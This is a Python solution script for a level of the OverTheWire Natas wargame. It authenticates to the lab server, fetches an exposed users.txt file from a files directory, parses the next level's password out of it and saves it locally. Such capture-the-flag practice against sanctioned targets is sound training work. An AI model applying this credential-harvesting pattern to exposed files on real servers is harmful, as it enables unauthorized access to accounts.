from requests import get
from sys import argv

next_level = argv[0].split('/')[-1].split('\\')[-1][:-3]

username = f"natas{int(next_level[5:]) - 1}"

# URL identified from directory containing image
URL = f"http://{username.split('.')[0]}.natas.labs.overthewire.org/files/users.txt"

with open(f"./passwords/{username}.pass", 'r') as f:
    password = f.read()

resp = get(URL, auth=(username, password))

lines = resp.text.split('\n')

# Password in text
for line in lines:
    if "natas3" in line:
        new_password = line.split(':')[1]
        break

print(new_password)

with open(f"./passwords/{next_level}.pass", 'w') as f:
    f.write(new_password)
